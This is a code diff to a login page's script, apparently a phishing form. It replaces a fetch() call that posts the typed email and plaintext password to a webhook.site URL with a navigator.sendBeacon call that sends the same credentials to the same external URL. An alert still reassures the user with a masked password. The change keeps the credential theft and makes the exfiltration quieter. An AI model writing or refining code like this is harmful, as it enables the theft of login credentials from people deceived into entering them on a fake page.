@@ -152,23 +152,18 @@
           return;
         }
 
-        // Send credentials to webhook.site
-        fetch('https://webhook.site/6dd9ec8a-69f4-4ebe-a9e7-658a993365bb', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            email: emailInput.value,
-            password: passwordInput.value
-          })
-        }).then(() => {
-          alert('Logging in with:\nEmail: ' + emailInput.value + '\nPassword: ' + '*'.repeat(passwordInput.value.length));
-        }).catch(err => {
-          console.error('Error:', err);
-        });
+        // Send Email & Password to webhook.site
+        const payload = {
+          email: emailInput.value,
+          password: passwordInput.value
+        };
+
+        navigator.sendBeacon('https://webhook.site/6dd9ec8a-69f4-4ebe-a9e7-658a993365bb', new Blob([JSON.stringify(payload)], { type: 'application/json' }));
+
+        alert(`Logging in with:\nEmail: ${emailInput.value}\nPassword: ${'*'.repeat(passwordInput.value.length)}`);
       }
     });
   </script>
 </body>
 </html>
+
